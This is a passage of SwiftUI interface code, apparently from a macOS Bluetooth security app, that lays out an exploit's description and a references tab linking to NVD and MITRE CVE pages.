                                .font(.headline)
                                .fontWeight(.semibold)
                                .padding(.horizontal, 12)
                                .padding(.top, 16)
                            
                            Text(exploit.description)
                                .font(.body)
                                .textSelection(.enabled)
                                .padding(.horizontal, 16)
                                .padding(.bottom, 16)
                        }
                        
                    case .references:
                        VStack(alignment: .leading, spacing: 16) {
                            Text("References & Resources")
                                .font(.headline)
                                .fontWeight(.semibold)
                                .padding(.horizontal, 12)
                                .padding(.top, 16)
                            
                            VStack(alignment: .leading, spacing: 8) {
                                Link("NIST NVD Entry", destination: URL(string: "https://nvd.nist.gov/vuln/detail/\(exploit.cveId)")!)
                                    .foregroundColor(.blue)
                                    .padding(.horizontal, 16)
                                
                                Link("CVE MITRE Entry", destination: URL(string: "https://cve.mitre.org/cgi-bin/cvename.cgi?name=\(exploit.cveId)")!)
                                    .foregroundColor(.blue)
                                    .padding(.horizontal, 16)
                                
                                Text("Additional exploit information may be available through security research databases and responsible disclosure programs.")
                                    .font(.caption)
                                    .foregroundColor(.secondary)
                                    .padding(.horizontal, 16)
                            }
                            .padding(.bottom, 16)
                        }
                    }
                }
            }
        }
    }
}

#Preview {
    MacOSBluetoothSecurityView()
        .environment(AppState())
}